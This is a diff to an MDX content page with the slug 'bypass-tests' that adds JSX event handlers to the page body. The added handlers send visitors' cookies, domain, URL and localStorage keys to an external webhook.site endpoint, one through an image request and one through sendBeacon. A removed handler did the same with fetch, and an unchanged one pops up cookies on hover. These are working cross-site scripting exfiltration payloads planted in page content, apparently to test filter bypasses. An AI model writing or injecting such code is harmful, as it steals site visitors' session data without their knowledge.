@@ -8,7 +8,9 @@ slug: bypass-tests
 
 <div {...{onMouseEnter: () => { if(typeof document !== 'undefined') alert('cookie: ' + document.cookie.substring(0,200)) }}}>Hover here to see cookies</div>
 
-<div {...{onClick: () => { if(typeof document !== 'undefined') { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=client-xss', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cookie: document.cookie, domain: document.domain, url: window.location.href, localStorage: JSON.stringify(Object.keys(localStorage))}) }).catch(() => {}); alert('Exfiltrated to webhook'); } }}}>Click here to exfil cookies to webhook</div>
+<div {...{onClick: () => { if(typeof document !== 'undefined') { new Image().src = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=client-img&cookie=' + encodeURIComponent(document.cookie.substring(0,500)) + '&domain=' + document.domain + '&url=' + encodeURIComponent(window.location.href); alert('Exfiltrated via img tag'); } }}}>Click here to exfil cookies (img bypass)</div>
+
+<div {...{onClick: () => { if(typeof navigator !== 'undefined' && navigator.sendBeacon) { navigator.sendBeacon('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=client-beacon', JSON.stringify({cookie: document.cookie, domain: document.domain, url: window.location.href, ls: Object.keys(localStorage)})); alert('Exfiltrated via sendBeacon'); } }}}>Click here to exfil cookies (beacon bypass)</div>
 
 ---
 
